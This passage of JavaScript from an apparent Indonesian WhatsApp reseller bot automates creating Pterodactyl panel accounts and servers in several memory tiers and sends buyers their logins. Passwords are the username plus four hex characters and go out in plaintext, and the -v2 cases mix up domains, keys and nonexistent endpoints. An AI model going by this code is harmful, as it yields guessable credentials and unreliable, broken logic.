var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c3gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "3024"
let cpu = "80"
let disk = "3024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg"
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c4gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "4024"
let cpu = "100"
let disk = "4024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c4gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "4024"
let cpu = "100"
let disk = "4024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c5gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "5024"
let cpu = "140"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c5gb-v2": {

if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "5024"
let cpu = "140"
let disk = "5024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c6gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "6024"
let cpu = "170"
let disk = "6024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c6gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "6024"
let cpu = "170"
let disk = "6024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succes Create Akun Panel Server 2*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domainV2}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domainV2 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(locV2)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c7gb": {
if (!isCreator && !isSeller) return Reply(mess.seller)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.egg
let loc = global.loc
let memo = "7024"
let cpu = "180"
let disk = "7024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
Reply(`*Berhasil Membuat Akun Panel*\n*Data Akun Sudah Dikirim Ke nomor ${ceknya}*
*crate user + server id :* ${user.id}`)
ctf = `*Data Akun Panel Anda*

*Succesfully Create Akun Panel*

*BERIKUT DETAIL AKUN PANEL ANDA*

* *ID SERVER :* ${user.id}
* *NAMA :* ${name}
* *USERNAME :* ${user.username}
* *PASSWORD :* ${password}
* *LINK LOGIN :* ${global.domain}


*Rules Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* dilarang membagikan link login 
* dilarang ddos panel terimakasih
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
TamaMods.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: TamaMods.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return Reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
}

break
//----------(Batas Case)----------//
case "c7gb-v2": {
if (!isCreator && !isSellerr) return Reply(mess.seller2)
let t = text.split(',');
if (t.length < 2) return Reply(`*Format salah!*
Penggunaan:
${prefix+command} user,nomer`)
var ceknya = text.split(",")[1]
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var check = await TamaMods.onWhatsApp(ceknya)
if (!check[0].exists) return Reply("Nomor Target Tidak Valid!")
let name = capital(username) + " Server"
let egg = global.eggV2
let loc = global.locV2
let memo = "7024"
let cpu = "180"
let disk = "7024"
let email = username + "1398@gmail.com"
akunlo = "https://files.catbox.moe/wbl5er.jpg" 
if (!u) return
let d = (await TamaMods.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return Reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nestsV2/5/eggsV2/" + eggV2, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
